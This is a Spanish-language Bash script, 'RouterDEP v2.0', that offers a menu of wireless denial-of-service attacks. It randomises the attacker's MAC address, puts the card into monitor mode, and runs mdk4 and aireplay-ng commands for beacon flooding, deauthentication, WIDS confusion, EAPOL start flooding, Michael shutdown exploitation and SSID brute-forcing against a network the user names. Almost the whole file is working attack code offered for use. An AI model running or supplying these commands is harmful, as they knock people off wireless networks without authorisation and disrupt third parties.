#!/bin/bash

# Creador: Juan3817381
# RouterDEP v2.0 Mejora de diseño y mas metodos de ataques

# Colores

red="\e[1;31m"
cyan="\033[36m"
orange="\e[33m"
green="\e[0;32m\033[1m"
default="\e[0m"
yellow="\e[0;33m"

export DEBIAN_FRONTED=noninteractive

####### comprobar root
if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
echo -e "$cyan[$red!$cyan] Sin Acceso root no podras continuar..." 1>&2
exit
fi

trap ctrl_c INT

function ctrl_c(){
        echo -e $cyan" [$red!$cyan] Saliendo..."
        exit 0; stop ${interface}mon > /dev/null 2>&1
}

# Verficar  herramientas
which mdk4 > /dev/null  2>&1
if [ "$?" -eq "0" ]; then
echo -e ""
sleep 0.0
else
echo ""
echo -e $cyan "[$red!$cyan] Te falta la Herrmaienta MDK4 "
sleep 0.4
echo
echo -e $cyan "[+] Instalando MDK4... "
sudo apt-get install -y mdk4 > /dev/null 2>&1
clear
echo -e $cyan "[+] Herramienta Instalada "
sleep 2
bash routerdep2.sh
fi
which aireplay-ng > /dev/null  2>&1
if [ "$?" -eq "0" ]; then
echo -e ""
sleep 0.0
else
echo ""
echo -e $cyan "[$red!$cyan] Te falta la Herrmaienta AIREPLAY-NG "
sleep 0.4
echo
echo -e $cyan "[+] Instalando AIREPLAY-NG... "
sudo apt-get install -y aireplay-ng > /dev/bull 2>&1
clear
echo -e $cyan "[+] Herramienta Instalada"
sleep 2
bash routerdep2.sh
fi
which macchanger > /dev/null  2>&1
if [ "$?" -eq "0" ]; then
echo -e ""
sleep 0.0
else
echo ""
echo -e $cyan "[$red!$cyan] Te falta la Herrmaienta Macchanger "
sleep 0.4
echo
echo -e $cyan "[+] Instalando Macchenger... "
sudo apt-get install -y macchanger > /dev/bull 2>&1
clear
echo -e $cyan "[+] Herramienta Instalada"
sleep 2
bash routerdep2.sh
fi
clear
echo -e $cyan"Interfaz detectada:"$red
airmon-ng  | xargs | cut -d ' ' -f '6-6'
echo -e $cyan"-------------------"
echo
sleep 0.1 && echo -e $red  " # #########        ##################      ############### "
sleep 0.1 && echo -e $cyan " #           #      #                       #              #"
sleep 0.1 && echo -e $cyan " #            #     #                       #              #"
sleep 0.1 && echo -e $cyan " #             #    #                       #              #"
sleep 0.1 && echo -e $cyan " #              #   #                       # ############  "
sleep 0.1 && echo -e $cyan " #              #   ##################      #               "
sleep 0.1 && echo -e $cyan " #              #   #                       #               "
sleep 0.1 && echo -e $cyan " #              #   #                       #               "
sleep 0.1 && echo -e $cyan " #              #   #                       #               "
sleep 0.1 && echo -e $cyan " #             #    #                       #               "
sleep 0.1 && echo -e $cyan " #           #      #                       #               "
sleep 0.1 && echo -e $red  " # #########        ##################      #               "
sleep 0.1 && echo -e $cyan " -----------------------------------------------------------"
sleep 0.1 && echo -e $cyan "                      Router${red}DEP$cyan 2.${red}0           $red by$cyan Juan3817381"
echo
echo -e " ${cyan}1${red})$cyan Beacon Flooding"
echo
echo -e " ${cyan}2${red})$cyan Deauthentication and Disassociation"
echo
echo -e " ${cyan}3${red})$cyan WIDS Confusion"
echo
echo -e " ${cyan}4${red})$cyan Eapol Start Frames"
echo
echo -e " ${cyan}5${red})$cyan Aireplay-ng"
echo
echo -e " ${cyan}6${red})$cyan Michael Shotdown Explotation"
echo
echo -e " ${cyan}7${red})$cyan Probing SSID and BruteForcing "
echo
echo -e " ${cyan}8${red})$cyan Salir "
echo
read -p "> "

if [[ $REPLY =~ ^[1-8]$ ]]; then
    if [[ $REPLY == 8 ]]; then
        clear
        echo
        echo -e "${cyan}Router${red}DEP$cyan 2.${red}0$cyan -$red by$cyan Juan3817381"
        sleep 0.3
        exit
fi
if [[ $REPLY == 1 ]]; then
        echo
        echo -e $cyan "Escribe el Nombre (ESSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read ssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface b -n $ssid -s 10000
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 2 ]]; then
        echo
        echo -e $cyan "Escribe el Nombre (ESSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read ssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1        
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface d -E $ssid -s 10000
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 3 ]]; then
        echo
        echo -e $cyan "Escribe el Nombre (ESSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read ssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface w -e $ssid -s 10000  
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 4 ]]; then
        echo
        echo -e $cyan "Escribe la Direccion MAC (BSSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read bssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface e -t $bssid -s 1000
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 5 ]]; then
        echo
        echo -e $cyan "Escribe la direccion MAC (BSSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read bssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s aireplay-ng --deauth 0 -a $bssid  $interface
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 6 ]]; then
        echo
        echo -e $cyan "Escribe la direccion MAC (BSSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read bssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface m -t $bssid -j -s 10000
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh
fi
if [[ $REPLY == 7 ]]; then
        echo
        echo -e $cyan "Escribe el Nombre (ESSID) de la Red"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read ssid
        echo
        echo -e $cyan "Duracion del ataque en segundos"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read sec
        echo
        echo -e "$cyan Por Ultimo Elige una interfaz para realizar el ataque"
        echo
        printf "${cyan}(Router${red}DEP${cyan})$red >$cyan "
        read interface
        echo
        echo -e $cyan"[$red+$cyan] Configurando ataque... "
        sleep 2.3
        ifconfig $interface down > /dev/null 2>&1
	macchanger -r $interface > /dev/null 2>&1
	airmon-ng start $interface > /dev/null 2>&1
        echo
        echo -e $cyan"[$red+$cyan] Dale ENTER para empezar el ataque"
        read pause
        echo -e "$red"
        timeout --foreground $sec$s mdk4 $interface p -e $ssid -s 10000
        sleep 1
        airmon-ng stop $interface >/dev/null 2>&1
        sleep 5
        bash routerdep2.sh




        fi
else
        echo ""
        echo -e "$cyan[$red!$cyan] Opcion Invalida..."
        sleep 1.3
        bash routerdep2.sh
fi

